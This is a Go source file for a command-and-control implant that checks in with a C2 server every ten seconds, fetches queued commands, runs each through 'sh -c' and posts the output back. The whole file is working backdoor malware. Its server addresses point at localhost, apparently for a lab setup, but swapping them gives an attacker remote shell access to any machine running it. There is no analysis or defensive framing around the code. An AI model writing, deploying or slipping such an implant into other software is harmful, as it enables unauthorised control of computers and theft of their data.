package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"time"
)

const (
	checkInURL       = "http://localhost:8080/api/checkin"       // Endpoint for implant check-in
	commandsURL      = "http://localhost:8080/implants/%s/commands" // Endpoint to fetch pending commands
	commandResultURL = "http://localhost:8080/command-result" // Endpoint to send command output
	implantID        = "202f0a52-9fb3-438b-81a7-640f2d2b24ef"    // Unique ID of the implant
	checkInInterval  = 10 * time.Second                          // Interval for checking in with the C2 server
)

// Command represents a command from the C2 server
type Command struct {
	ID      int    `json:"id"`      // Command ID
	Command string `json:"command"` // Command to execute
}

func main() {
	for {
		checkIn()
		fetchAndExecuteCommands()
		time.Sleep(checkInInterval)
	}
}

// checkIn updates the implant's status, IP address, and last seen timestamp
func checkIn() {
	// Prepare the payload for the check-in request
	payload := map[string]string{
		"implant_id": implantID,
		"ip_address": "192.168.1.100", // Replace with the actual IP address
	}
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshaling payload:", err)
		return
	}

	// Send the POST request to the C2 server
	resp, err := http.Post(checkInURL, "application/json", bytes.NewBuffer(payloadBytes))
	if err != nil {
		fmt.Println("Error during check-in:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Println("Check-in successful")
}

func fetchAndExecuteCommands() {
	// Fetch pending commands from the C2 server
	resp, err := http.Get(fmt.Sprintf(commandsURL, implantID))
	if err != nil {
		fmt.Println("Error fetching commands:", err)
		return
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}
	bodyString := string(body)

	fmt.Println("Response Body:", bodyString)

	// Parse the response into a list of commands
	var response struct {
		Commands []Command `json:"commands"`
	}
	if err := json.Unmarshal(body, &response); err != nil {
		fmt.Println("Error decoding response:", err)
		return
	}

	fmt.Println("Fetched commands:", response.Commands)

	// Execute each command and send the output back to the C2 server
	for _, cmd := range response.Commands {
		output := executeCommand(cmd.Command)
		sendOutput(cmd.ID, output)
	}
}

// executeCommand executes a shell command and returns the output
func executeCommand(cmd string) string {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}
	return string(out)
}

// sendOutput sends the command output back to the C2 server
func sendOutput(commandID int, output string) {
	// Prepare the payload
	payload := map[string]interface{}{
		"command_id": commandID,
		"output":     output,
	}
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshaling payload:", err)
		return
	}

	// Send the POST request to the C2 server
	resp, err := http.Post(commandResultURL, "application/json", bytes.NewBuffer(payloadBytes))
	if err != nil {
		fmt.Println("Error sending output:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Command %d output sent successfully\n", commandID)
}